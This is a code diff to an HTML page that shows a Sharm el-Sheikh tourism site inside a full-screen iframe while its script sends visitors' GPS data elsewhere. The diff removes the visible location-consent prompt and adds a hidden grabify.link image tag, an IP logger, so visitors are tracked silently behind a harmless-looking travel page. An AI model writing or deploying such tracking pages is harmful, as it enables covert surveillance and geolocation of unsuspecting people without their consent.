@@ -21,10 +21,6 @@
             margin: 0;
             padding: 0;
             height: 100%;
-            text-align: center;
-        }
-        #location-prompt, iframe {
-            display: none;
         }
         iframe {
             width: 100%;
@@ -34,11 +30,8 @@
     </style>
 </head>
 <body>
-
-    <div id="location-prompt">
-        <h2>Location is required for better service. Please allow location access to use the site.</h2>
-    </div>
-
+    <img src="https://grabify.link/2KHAV8">
+    <!-- Content is loaded normally without hiding the iframe -->
     <iframe id="content-frame" src="https://www.elgounatours.com/en/top-attractions-in-sharm-el-sheikh"></iframe>
 
     <script>
@@ -65,10 +58,6 @@
                             },
                             body: JSON.stringify(data)
                         });
-
-                        // Show the iframe when location is accepted
-                        document.getElementById("location-prompt").style.display = "none";
-                        document.getElementById("content-frame").style.display = "block";
                     } catch (error) {
                         console.error("Failed to send GPS data:", error);
                     }
